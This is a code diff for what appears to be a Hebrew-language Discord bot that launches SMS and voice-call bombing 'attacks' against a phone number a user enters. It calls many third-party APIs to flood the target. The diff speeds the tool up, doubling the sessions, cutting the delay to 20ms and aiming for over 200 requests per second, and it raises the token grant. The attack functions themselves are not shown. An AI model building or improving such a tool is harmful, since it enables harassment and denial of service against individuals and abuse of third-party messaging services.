-            f"🎯 **ACTIVATED!**\n📱 {phone}\n💎 נותרו: {user_doc['tokens']-1}",
+            f"⚡ **SPEED ACTIVATED!**\n📱 {phone}\n💎 נותרו: {user_doc['tokens']-1}",
             ephemeral=True
         )
         
-        asyncio.create_task(smart_attack(phone, duration, attack_type, user_id, interaction, attack_id))
+        asyncio.create_task(speed_attack(phone, duration, user_id, interaction, attack_id))
 
 class MainView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=180)
     
-    @discord.ui.button(label="🎯 SMART ATTACK", style=discord.ButtonStyle.danger)
+    @discord.ui.button(label="⚡ SPEED ATTACK", style=discord.ButtonStyle.danger)
     async def attack_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_modal(AttackModal())
     
@@ -504,24 +545,24 @@ async def setup(interaction: discord.Interaction):
     user_doc = await users_col.find_one({"user_id": user_id})
     
     if not user_doc:
-        await users_col.insert_one({"user_id": user_id, "tokens": 100000})
-        tokens = 100000
+        await users_col.insert_one({"user_id": user_id, "tokens": 1000000})
+        tokens = 1000000
     else:
         tokens = user_doc.get("tokens", 0)
     
     active = len([a for a in bot.active_attacks if a.startswith(user_id) and bot.active_attacks[a]])
     
     embed = discord.Embed(
-        title="🎯 MEGA ULTIMATE EDITION",
-        description=f"**{len(ALL_APIS)}** APIs | 15 סשנים | 100-200ms",
+        title="⚡ ULTIMATE SPEED EDITION",
+        description=f"**{len(ALL_APIS)}** APIs | 30 סשנים | 20ms",
         color=0xff0000
     )
     embed.add_field(name="💎 טוקנים", value=f"**{tokens}**")
     embed.add_field(name="🎯 פעיל", value=active)
-    embed.add_field(name="📊 סוגים", value=f"{len(MAGENTO_APIS)} מג'נטו | {len(SMS_APIS)} SMS | {len(VOICE_APIS)} Voice")
+    embed.add_field(name="🚀 מטרה", value="200+/שנייה")
     
     await interaction.response.send_message(embed=embed, view=MainView())
 
 if __name__ == "__main__":
-    print(f"🎯 טוען {len(ALL_APIS)} APIs...")
+    print(f"⚡ טוען {len(ALL_APIS)} APIs...")
     bot.run(TOKEN)
